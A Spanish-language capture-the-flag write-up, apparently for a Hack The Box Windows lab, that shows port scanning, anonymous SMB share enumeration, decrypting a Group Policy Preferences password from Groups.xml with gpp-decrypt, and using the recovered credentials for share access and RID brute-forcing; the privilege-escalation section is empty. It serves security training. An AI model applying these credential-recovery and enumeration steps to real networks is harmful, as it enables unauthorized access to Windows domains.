## Resumen

### Herramientas

## Escaneo y enumeración
Empezaremos como es de costumbre haciendo un escaneo rápido de puertos TCP y veremos muchos puertos abiertos los cuales apuntan a ser un sistema operativo Windows

```bash
sudo nmap -sS -Pn -p- -T4 --min-rate 5000 10.129.28.177
```

![](Pasted%20image%2020260504160502.png)

Seguidamente haré un escaneo específico de versiones, para ver ante que servicios estamos y saber por dónde empezar. Como habíamos dicho estamos ante un SO Windows Server 2008 en el que vemos que tiene abierto el puerto 445 abierto equivalente a smb, así que empezaremos al enumeración por ahí

```bash
sudo nmap -sCV 10.129.28.177
```

![](Pasted%20image%2020260504160955.png)

Haciendo una enumeración con enum4linux podemos ver las siguientes carpetas compartidas y como tenemos acceso total a la carpeta Replication

```bash
enum4linux -a 10.129.28.177
```

![](Pasted%20image%2020260504161323.png)

Si accedemos a la carpeta como anónimo con smbclient veremos que contiene un directorio que se llama active.htb el cual contiene más información que procederemos a investigar

```bash
smbclient //10.129.28.177/Replication
```

![](Pasted%20image%2020260504161620.png)


Para ello me descargaré toda la información de la siguiente forma

![](Pasted%20image%2020260504162121.png)

Después de buscar entre los archivos encontramos un fichero xml "Groups.xml" en el cual se pueden ver lo que parecen ser credenciales, con una contraseña cifrada y el usuario de un dominio SVC_TGS

![](Pasted%20image%2020260504162704.png)

## Explotación 

Investigando sobre las contraseñas que maneja Windows 2008 Server sabemos que en esa versión se introdujo Group Policy Preferences, así que extraeremos la contraseña usando gpp-decrypt para este tipo de credenciales. Y de esta forma tendremos las credenciales exitosamente del usuario active.htb

```bash
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

![](Pasted%20image%2020260504164240.png)

Ahora con los privilegios veremos a que podemos tener acceso. Así que usando smbmap ahora podemos ver que tenemos acceso al directorio Users el cual puede tener información importante

```bash
smbmap -d active.htb -p GPPstillStandingStrong2k18 -u SVC_TGS -H 10.129.28.177
```

![](Pasted%20image%2020260504164824.png)

Con smbclient podemos ver que hay distintos directorios e información que debemos ir investigando para encontrar posibles datos que podamos usar 

```bash
smbclient //10.129.28.177/Users -U active.htb/SVC_TGS%GPPstillStandingStrong2k18
```

![](Pasted%20image%2020260504165130.png)

Lo primero que podemos encontrar en el directorio del propio usuario es la primera flag user.txt la cual descargaremos en nuestro equipo

![](Pasted%20image%2020260504165339.png)

Haciendo fuerza bruta de usuarios con netexec ya que tenemos una credenciales útiles vemos que hay un usuario Administrator

```bash
nxc smb 10.129.28.177 -u "SVC_TGS" -p "GPPstillStandingStrong2k18" --rid-brute
```

![](Pasted%20image%2020260504165730.png)

## Escalada de privilegios


